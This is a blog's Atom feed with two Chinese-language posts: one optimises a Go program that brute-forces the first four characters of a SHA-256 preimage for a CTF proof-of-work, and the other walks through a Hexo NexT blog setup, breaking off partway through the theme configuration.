<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Thorns All The Way</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://www.hydewww.cn/"/>
  <updated>2019-05-20T16:00:00.000Z</updated>
  <id>https://www.hydewww.cn/</id>
  
  <author>
    <name>hydewww</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Go语言爆破Sha256前四字符</title>
    <link href="https://www.hydewww.cn/sha256-go/"/>
    <id>https://www.hydewww.cn/sha256-go/</id>
    <published>2019-05-20T16:00:00.000Z</published>
    <updated>2019-05-20T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>做 CTF 时需要求 sha256 原字符串的前四位，最近正好在学 golang ，就打算用 golang 实现一下。期间总觉得 golang 应该更快，就开始优化代码，从 9.5 秒优化到了 1.5 秒。</p><a id="more"></a><blockquote><p>sha256(XXXX+DEHNCHyUEO8kVZBT) == 3354de5346a962dd0f344de80cd3c8e5c2d3ce1a18437141b6a645df9b357c91</p></blockquote><p>代码地址： <a href="https://github.com/hydewww/sha256-go" target="_blank" rel="noopener">https://github.com/hydewww/sha256-go</a></p><p><strong>下面的代码为了测试性能，都没有在算出结果后就结束程序。</strong></p><h2 id="easy"><a href="#easy" class="headerlink" title="easy"></a>easy</h2><p>第一版代码如下。<em>sha256参考： <a href="https://godoc.org/crypto/sha256" target="_blank" rel="noopener">https://godoc.org/crypto/sha256</a></em> </p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// easy</span></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">  chars = <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span> + <span class="string">"abcdefghijklmnopqrstuvwxyz"</span> + <span class="string">"0123456789"</span> <span class="comment">// A-Z a-z 0-9</span></span><br><span class="line">tail   = <span class="string">"DEHNCHyUEO8kVZBT"</span> <span class="comment">// 原字符串的尾部</span></span><br><span class="line">result = <span class="string">"3354de5346a962dd0f344de80cd3c8e5c2d3ce1a18437141b6a645df9b357c91"</span> <span class="comment">// hash值</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sha</span><span class="params">(head <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">h := sha256.New()</span><br><span class="line">h.Write([]<span class="keyword">byte</span>(head + tail))</span><br><span class="line">str := fmt.Sprintf(<span class="string">"%x"</span>, h.Sum(<span class="literal">nil</span>))</span><br><span class="line"><span class="keyword">if</span> str == result &#123;</span><br><span class="line">fmt.Println(head)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">start := time.Now()</span><br><span class="line"><span class="keyword">for</span> _, ch1 := <span class="keyword">range</span> chars &#123;</span><br><span class="line"><span class="keyword">for</span> _, ch2 := <span class="keyword">range</span> chars &#123;</span><br><span class="line"><span class="keyword">for</span> _, ch3 := <span class="keyword">range</span> chars &#123;</span><br><span class="line"><span class="keyword">for</span> _, ch4 := <span class="keyword">range</span> chars &#123;</span><br><span class="line">sha(<span class="keyword">string</span>(ch1) + <span class="keyword">string</span>(ch2) + <span class="keyword">string</span>(ch3) + <span class="keyword">string</span>(ch4))</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">end := time.Since(start)</span><br><span class="line">fmt.Println(end)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行时间 9.5 秒</strong> </p><h2 id="goroutine-并发"><a href="#goroutine-并发" class="headerlink" title="goroutine 并发"></a>goroutine 并发</h2><p>因为第一版对比 python 没有明显性能优势，因此尝试用 goroutine 并发执行。<em>WaitGroup参考：<a href="https://golang.org/pkg/sync/#example_WaitGroup" target="_blank" rel="noopener">https://golang.org/pkg/sync/#example_WaitGroup</a></em></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ez_goroutine</span></span><br><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sha</span><span class="params">(...)</span></span> &#123;</span><br><span class="line">  ...</span><br><span class="line">  wg.Done()<span class="comment">// 完成任务</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span> <span class="params">()</span></span> &#123;</span><br><span class="line">  ...</span><br><span class="line">  <span class="keyword">for</span> ... &#123;</span><br><span class="line">    <span class="keyword">for</span> ... &#123;</span><br><span class="line">      <span class="keyword">for</span> ... &#123;</span><br><span class="line">        <span class="keyword">for</span> ... &#123;</span><br><span class="line">          wg.Add(<span class="number">1</span>)<span class="comment">// 新增1个任务</span></span><br><span class="line">          <span class="keyword">go</span> sha(...)<span class="comment">// 新建goroutine执行sha</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  wg.Wait()<span class="comment">// 阻塞，等待所有任务执行完成</span></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行时间 7.1 秒</strong> </p><h2 id="string-gt-byte"><a href="#string-gt-byte" class="headerlink" title="string -&gt; byte"></a>string -&gt; byte</h2><p>感觉还是不够快，于是开始做性能测试。</p><p>在单线程代码的基础上测量 sha256 以外的运算所使用的时间</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test/nohash</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sha</span><span class="params">(head <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> hash = []<span class="keyword">byte</span>(head + tail)</span><br><span class="line"><span class="comment">// h := sha256.New()</span></span><br><span class="line"><span class="comment">// h.Write([]byte(head + tail))</span></span><br><span class="line"><span class="comment">// hash := h.Sum(nil)</span></span><br><span class="line">str := fmt.Sprintf(<span class="string">"%x"</span>, hash)</span><br><span class="line"><span class="keyword">if</span> str == result &#123;</span><br><span class="line">fmt.Println(head)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>运行时间 4.3 秒。由于 sha256 运算使用的都是 byte 数组，而代码输入输出中使用的都是字符串，存在很多的强制类型转换，因此占用了较长时间。下面将代码运算改为 byte 类型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// byte</span></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">chars = []<span class="keyword">byte</span>(<span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span> + <span class="string">"abcdefghijklmnopqrstuvwxyz"</span> + <span class="string">"0123456789"</span>)</span><br><span class="line">tail = []<span class="keyword">byte</span>(<span class="string">"DEHNCHyUEO8kVZBT"</span>)</span><br><span class="line">result, _ = hex.DecodeString(<span class="string">"3354de5346a962dd0f344de80cd3c8e5c2d3ce1a18437141b6a645df9b357c91"</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sha</span><span class="params">(head []<span class="keyword">byte</span>)</span></span> &#123;</span><br><span class="line">...</span><br><span class="line">h.Write(head)</span><br><span class="line">  h.Write(tail) <span class="comment">// hash特性 H(s1+s2) = H(H(s1)+s2)</span></span><br><span class="line">  <span class="keyword">if</span> bytes.Equal(h.Sum(<span class="literal">nil</span>), result) &#123; <span class="comment">// byte数组比较使用 bytes.Equal()</span></span><br><span class="line">fmt.Println(<span class="keyword">string</span>(head))</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">  ...</span><br><span class="line"><span class="keyword">for</span> ... &#123;</span><br><span class="line"><span class="keyword">for</span> ... &#123;</span><br><span class="line"><span class="keyword">for</span> ... &#123;</span><br><span class="line"><span class="keyword">for</span> ... &#123;</span><br><span class="line">sha([]<span class="keyword">byte</span>&#123;ch1, ch2, ch3, ch4&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行时间减少为 4.8 秒</strong>。</p><h2 id="并发优化"><a href="#并发优化" class="headerlink" title="并发优化"></a>并发优化</h2><p>将 <code>goroutine</code> 代码也同上优化（ <code>byte_goroutine</code> ），运行时间 5.9 秒 ，虽然快了 1 秒多但却比单线程慢。</p><p>猜测是 goroutine 分配使用的时间，将 sha 运算忽略进行测试。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test/goroutine</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sha</span><span class="params">(head []<span class="keyword">byte</span>)</span></span> &#123;</span><br><span class="line">wg.Done()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">for</span> <span class="keyword">range</span> chars &#123;</span><br><span class="line"><span class="keyword">for</span> <span class="keyword">range</span> chars &#123;</span><br><span class="line"><span class="keyword">for</span> <span class="keyword">range</span> chars &#123;</span><br><span class="line"><span class="keyword">for</span> <span class="keyword">range</span> chars &#123;</span><br><span class="line">wg.Add(<span class="number">1</span>)</span><br><span class="line"><span class="keyword">go</span> sha([]<span class="keyword">byte</span>&#123;&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">wg.Wait()</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行时间 5.2s， 确实是 goroutine 的分配和回收占用了大量时间。</p><p>根据 cpu 核心数分配相应数量的 goroutine，才能使效率更高，如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// final_goroutine</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">sha</span><span class="params">(s []<span class="keyword">byte</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> _, ch1 := <span class="keyword">range</span> s &#123;</span><br><span class="line"><span class="keyword">for</span> _, ch2 := <span class="keyword">range</span> chars &#123;</span><br><span class="line"><span class="keyword">for</span> _, ch3 := <span class="keyword">range</span> chars &#123;</span><br><span class="line"><span class="keyword">for</span> _, ch4 := <span class="keyword">range</span> chars &#123;</span><br><span class="line">head := []<span class="keyword">byte</span>&#123;ch1, ch2, ch3, ch4&#125;</span><br><span class="line">h := sha256.New()</span><br><span class="line">h.Write(head)</span><br><span class="line">h.Write(tail)</span><br><span class="line"><span class="keyword">if</span> bytes.Equal(h.Sum(<span class="literal">nil</span>), result) &#123;</span><br><span class="line">fmt.Println(<span class="keyword">string</span>(head))</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">wg.Done()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">threads := runtime.NumCPU() <span class="comment">// 获取cpu逻辑核心数（包括超线程）</span></span><br><span class="line"><span class="comment">/* len(chars) = sum * sthreads + (sum+1) * (threads-sthreads) */</span></span><br><span class="line">snum := <span class="built_in">len</span>(chars) / threads</span><br><span class="line">sthreads := threads*(<span class="number">1</span>+snum) - <span class="built_in">len</span>(chars)</span><br><span class="line"></span><br><span class="line">wg.Add(threads)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; threads; i++ &#123;</span><br><span class="line"><span class="keyword">if</span> i &lt; sthreads &#123;</span><br><span class="line"><span class="keyword">go</span> sha(chars[snum*i : snum*(i+<span class="number">1</span>)])</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">base := snum * sthreads</span><br><span class="line"><span class="keyword">go</span> sha(chars[base+(snum+<span class="number">1</span>)*(i-sthreads) : base+(snum+<span class="number">1</span>)*(i-sthreads+<span class="number">1</span>)])</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">wg.Wait()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>运行时间 1.5 秒</strong> ，舒服了！</p><p>想到一开始的 <code>goroutine</code> 运行时间长应该不完全是因为类型转换，使用这个分配逻辑（ <code>re_goroutine</code> ）以后运行时间为 3 秒。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;做 CTF 时需要求 sha256 原字符串的前四位，最近正好在学 golang ，就打算用 golang 实现一下。期间总觉得 golang 应该更快，就开始优化代码，从 9.5 秒优化到了 1.5 秒。&lt;/p&gt;
    
    </summary>
    
      <category term="Coding" scheme="https://www.hydewww.cn/categories/Coding/"/>
    
    
      <category term="golang" scheme="https://www.hydewww.cn/tags/golang/"/>
    
      <category term="sha256" scheme="https://www.hydewww.cn/tags/sha256/"/>
    
      <category term="goroutine" scheme="https://www.hydewww.cn/tags/goroutine/"/>
    
  </entry>
  
  <entry>
    <title>Hexo NexT 博客搭建</title>
    <link href="https://www.hydewww.cn/Hexo-NexT/"/>
    <id>https://www.hydewww.cn/Hexo-NexT/</id>
    <published>2018-05-13T16:00:00.000Z</published>
    <updated>2019-05-20T16:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<p>博客被自己搞崩了，重搭顺便记录一下过程。</p><p><a href="https://hexo.io/zh-cn/" target="_blank" rel="noopener">Hexo</a> 是一个基于Node.js的博客框架，文章使用Markdown语法，很容易就能部署到GitHub Pages、Coding Pages上。</p><p><a href="https://theme-next.iissnan.com/" target="_blank" rel="noopener">NexT</a> 是Hexo颇受欢迎的一个主题，即本博客所使用的主题，更多主题请看<a href="https://hexo.io/themes/" target="_blank" rel="noopener">此页面</a>。</p><a id="more"></a><h1 id="安装配置"><a href="#安装配置" class="headerlink" title="安装配置"></a>安装配置</h1><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><ul><li>安装 <a href="https://nodejs.org/en/download/" target="_blank" rel="noopener">Node.js</a> 和  <a href="https://yarn.bootcss.com/docs/install" target="_blank" rel="noopener">Yarn</a> ，Mac 可以通过 <code>brew install yarn</code> 同时安装</li><li>下载稳定版 <a href="https://github.com/theme-next/hexo-theme-next/releases" target="_blank" rel="noopener">NexT</a></li></ul><p>初始化 hexo</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yarn global add hexo-cli</span><br><span class="line"><span class="built_in">cd</span> &lt;where_u_want&gt;</span><br><span class="line">hexo init &lt;blog_folder_name&gt;</span><br><span class="line"><span class="built_in">cd</span> &lt;blog_folder_name&gt;</span><br><span class="line">yarn install</span><br></pre></td></tr></table></figure><p>安装其他依赖 （ Git、RSS、本地搜索）</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yarn add hexo-deployer-git hexo-generator-feed hexo-generator-searchdb hexo-generator-sitemap</span><br></pre></td></tr></table></figure><h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><p>这里使用 <code>NexT</code> 的命名方式，将站点根目录下的 <code>_config.yml</code> 文件称作 <strong>站点配置文件</strong> ，将主题目录下的 <code>_config.yml</code> 文件称作 <strong>主题配置文件</strong>。</p><p>将下载的 NexT 主题文件复制至如下位置并重命名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml # 站点配置文件</span><br><span class="line">├── public      # 静态文件目录</span><br><span class="line">├── source          # 博客文件</span><br><span class="line">|   ├── _posts      # 文章</span><br><span class="line">|   ├── _drafts     # 草稿 默认不渲染</span><br><span class="line">|.  └── categories  # 分类</span><br><span class="line">|   |   └── index.md</span><br><span class="line">├── themes              # 主题</span><br><span class="line">|   ├── next            # 主题名</span><br><span class="line">|   |   ├── _config.yml # 主题配置文件</span><br><span class="line">|   |   └── ...</span><br><span class="line">└── ...</span><br></pre></td></tr></table></figure><h2 id="分类、标签页面"><a href="#分类、标签页面" class="headerlink" title="分类、标签页面"></a>分类、标签页面</h2><p>在 <code>source</code> 下创建 <code>categories</code> 目录，在其中创建 <code>index.md</code> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: Categories</span><br><span class="line">date: 2019/5/21 00:00:00</span><br><span class="line">type: &quot;categories&quot;</span><br><span class="line">comments: false</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>在 <code>source</code> 下创建 <code>tags</code> 目录，在其中创建 <code>index.md</code> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: Tags</span><br><span class="line">date: 2019/5/21 00:00:00</span><br><span class="line">type: &quot;tags&quot;</span><br><span class="line">comments: false</span><br><span class="line">---</span><br></pre></td></tr></table></figure><h2 id="站点配置文件"><a href="#站点配置文件" class="headerlink" title="站点配置文件"></a>站点配置文件</h2><p>仅列出修改条目</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># hexo: 3.8.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Site</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">Throns</span> <span class="string">All</span> <span class="string">The</span> <span class="string">Way</span> <span class="comment"># 博客名</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">hydewww</span> <span class="comment"># 作者名</span></span><br><span class="line"><span class="attr">language:</span> <span class="string">zh-CN</span> <span class="comment"># 这里NexT用zh-Hans会显示他国语言</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># URL</span></span><br><span class="line"><span class="attr">url:</span> <span class="string">www.hydewww.cn</span> <span class="comment"># 网站地址 需绑定域名</span></span><br><span class="line"><span class="attr">permalink:</span> <span class="string">:title/</span> <span class="comment"># 文章url格式 (/20180514/hexo-next/)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Directory</span></span><br><span class="line"><span class="attr">skip_render:</span> <span class="string">aaa/bbb</span> <span class="comment"># 不渲染source/aaa/bbb文件，可使用通配符*</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Extensions</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">next</span> <span class="comment"># 改变主题</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Deployment</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line"><span class="attr">  type:</span> <span class="string">git</span></span><br><span class="line"><span class="attr">  repo:</span> </span><br><span class="line"><span class="attr">    github:</span> <span class="attr">https://github.com/hydewww/hydewww.github.io.git</span></span><br><span class="line"><span class="attr">    coding:</span> <span class="attr">https://git.dev.tencent.com/hydewww/blog.git</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 内容搜索</span></span><br><span class="line"><span class="attr">search:</span></span><br><span class="line"><span class="attr">  path:</span> <span class="string">search.xml</span></span><br><span class="line"><span class="attr">  field:</span> <span class="string">post</span></span><br><span class="line"><span class="attr">  format:</span> <span class="string">html</span></span><br><span class="line"><span class="attr">  limit:</span> <span class="number">1000</span></span><br></pre></td></tr></table></figure><h2 id="主题配置文件"><a href="#主题配置文件" class="headerlink" title="主题配置文件"></a>主题配置文件</h2><p>主题许多位置可自定义 icon 图标，可参考 <a href="https://fontawesome.com/v4.7.0/icons/" target="_blank" rel="noopener">https://fontawesome.com/v4.7.0/icons/</a></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># NexT: 7.1.1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 网站图标 存放路径 themes/next/source/images</span></span><br><span class="line"><span class="attr">favicon:</span></span><br><span class="line">  <span class="string">...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 页脚</span></span><br><span class="line"><span class="attr">footer:</span></span><br><span class="line"><span class="attr">  since:</span> <span class="number">2015</span></span><br><span class="line"><span class="attr">  icon:</span></span><br><span class="line"><span class="attr">    name:</span> <span class="string">heart</span></span><br><span class="line"><span class="attr">    animated:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">    color:</span> <span class="string">"#ff0000"</span></span><br><span class="line"><span class="attr">  powered:</span><span class="comment"># 显示 Powered by Hexo</span></span><br><span class="line"><span class="attr">    enable:</span> <span class="literal">false</span></span><br><span class="line"><span class="attr">  theme:</span><span class="comment"># 显示 Theme - NexT</span></span><br><span class="line"><span class="attr">    enable:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 版权声明</span></span><br><span class="line"><span class="attr">creative_commons:</span></span><br><span class="line"><span class="attr">  license:</span> <span class="string">by-nc-sa</span></span><br><span class="line"><span class="attr">  sidebar:</span> <span class="literal">true</span> <span class="comment"># 侧边栏显示</span></span><br><span class="line"><span class="attr">  post:</span> <span class="literal">true</span> <span class="comment"># 文章末尾显示</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 右上角显示github地址</span></span><br><span class="line"><span class="attr">github_banner:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  permalink:</span> <span class="attr">https://github.com/hydewww</span></span><br><span class="line"></span><br><span class="line"><span class="attr">seo:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 菜单栏</span></span><br><span class="line"><span class="attr">menu:</span> </span><br><span class="line"><span class="attr">  home:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">home</span></span><br><span class="line"><span class="attr">  categories:</span> <span class="string">/categories/</span> <span class="string">||</span> <span class="string">th</span></span><br><span class="line"><span class="attr">  archives:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">archive</span></span><br><span class="line"><span class="attr">  Leetcode:</span> <span class="string">/algorithm/</span> <span class="string">||</span> <span class="string">code</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 菜单栏设置</span></span><br><span class="line"><span class="attr">menu_settings:</span></span><br><span class="line"><span class="attr">  badges:</span> <span class="literal">true</span> <span class="comment"># 显示数目</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># NexT主题</span></span><br><span class="line"><span class="attr">scheme:</span> <span class="string">Mist</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 侧边栏社交链接</span></span><br><span class="line"><span class="attr">social:</span></span><br><span class="line"><span class="attr">  GitHub:</span> <span class="attr">https://github.com/hydewww</span> <span class="string">||</span> <span class="string">github</span></span><br><span class="line"><span class="attr">  Leetcode:</span> <span class="attr">https://www.hydewww.cn/algorithm</span> <span class="string">||</span> <span class="string">code</span></span><br><span class="line"><span class="attr">  E-Mail:</span> <span class="attr">mailto:hydewwwww@gmail.com</span> 